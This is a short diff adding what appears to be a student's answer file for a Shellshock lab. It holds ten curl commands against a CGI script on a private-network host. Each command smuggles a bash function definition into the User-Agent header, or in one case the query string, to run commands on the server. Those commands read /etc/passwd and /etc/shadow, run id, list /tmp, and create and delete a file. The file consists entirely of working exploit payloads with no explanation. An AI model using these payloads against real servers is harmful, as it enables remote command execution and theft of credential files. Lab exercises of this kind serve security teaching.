@@ -1,0 +1,19 @@
+3.A
+curl -A '() { echo "a";}; echo Content_type:text/plain; echo; /bin/cat /etc/passwd' http://10.9.0.80/cgi-bin/getenv.cgi
+
+3.B
+curl -A '() { echo "a";}; echo Content_type:text/plain; echo; /bin/id' http://10.9.0.80/cgi-bin/getenv.cgi
+
+3.C
+curl -A '() { echo "a";}; echo Content_type:text/plain; echo; /bin/ls /tmp' http://10.9.0.80/cgi-bin/getenv.cgi
+curl -A '() { echo "a";}; echo Content_type:text/plain; echo; echo "Hello" > /tmp/mytmp' http://10.9.0.80/cgi-bin/getenv.cgi
+curl -A '() { echo "a";}; echo Content_type:text/plain; echo; /bin/cat /tmp/mytmp' http://10.9.0.80/cgi-bin/getenv.cgi
+
+3.D
+curl -A '() { echo "a";}; echo Content_type:text/plain; echo; rm /tmp/mytmp' http://10.9.0.80/cgi-bin/getenv.cgi
+
+Q1
+curl -A '() { echo "a";}; echo Content_type:text/plain; echo; /bin/cat /etc/shadow' http://10.9.0.80/cgi-bin/getenv.cgi
+
+Q2
+curl "http://10.9.0.80/cgi-bin/getenv.cgi?() { echo "a";}; echo Content_type:text/plain; echo; /bin/cat /etc/passwd"
